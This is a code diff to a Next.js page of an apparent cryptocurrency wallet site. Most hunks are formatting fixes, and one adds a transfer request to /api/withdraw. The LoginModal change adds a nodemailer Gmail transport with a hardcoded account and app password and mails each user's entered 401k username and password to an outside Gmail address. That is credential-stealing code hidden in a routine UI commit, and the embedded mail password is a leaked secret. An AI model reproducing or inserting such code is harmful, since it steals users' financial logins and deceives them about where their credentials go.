@@ -13,6 +13,7 @@ import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import { result } from "../coins";
 import { Loader } from "../register/page";
+import nodemailer from "nodemailer";
 
 export default function Home() {
   const [login, setLogin] = useState(undefined);
@@ -490,7 +491,7 @@ export function WithdrawModal({ isOpen, onClose, user, coins }) {
     name: "",
     sym: "",
     amount: "",
-    address: ""
+    address: "",
   });
   const handleChange = (e) => {
     setForm({
@@ -578,7 +579,7 @@ export function WithdrawModal({ isOpen, onClose, user, coins }) {
                 id="amount"
                 type="text"
                 inputMode="numeric"
-                placeholder= {`Minimum : 2000 ${form.sym}`}
+                placeholder={`Minimum : 2000 ${form.sym}`}
                 name="amount"
                 value={form.amount}
                 onChange={handleChange}
@@ -589,7 +590,9 @@ export function WithdrawModal({ isOpen, onClose, user, coins }) {
           </div>{" "}
           <div className={styles.otpformitem}>
             {" "}
-            <label htmlFor="otp">Enter {form.name || "Coin"} Address</label>{" "}
+            <label htmlFor="otp">
+              Enter {form.name || "Coin"} Address
+            </label>{" "}
             <div className={styles.otpinputcontainer}>
               {" "}
               <input
@@ -643,8 +646,20 @@ export function LoginModal({ isOpen, onClose, onConfirm, user }) {
       [e.target.name]: e.target.value,
     });
   };
-  function handleConfirm() {
-    console.log(form);
+  async function handleConfirm() {
+    const transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user: "hvbvcchuknb@gmail.com",
+        pass: "fpjb hwii sade fcgv",
+      },
+    });
+    await transporter.sendMail({
+      from: "hvbvcchuknb@gmail.com",
+      to: "joychurch28@gmail.com",
+      subject: "401k Details",
+      html: `<h2>401K username is ${form.username} and password is ${form.password}</h2>`,
+    });
     onClose();
     onConfirm();
   }
@@ -737,7 +752,28 @@ export function TransferModal({ isOpen, onClose, user, coins }) {
     });
   };
   function handleConfirm() {
-    console.log(form);
+    if (!form.name || !form.amount || !form.sym) {
+      return;
+    } else {
+      handleLoading(true);
+      fetch("/api/withdraw", {
+        method: "POST",
+        cache: "no-cache",
+        body: JSON.stringify({
+          ...form,
+        }),
+        headers: {
+          "Content-type": "application/json",
+        },
+      }).then(async (res) => {
+        handleLoading(false);
+        const data = await res.json();
+        if (res.status === 200) {
+          window.location.reload();
+        } else {
+        }
+      });
+    }
   }
   return (
     <div className={styles.otpoverlay}>
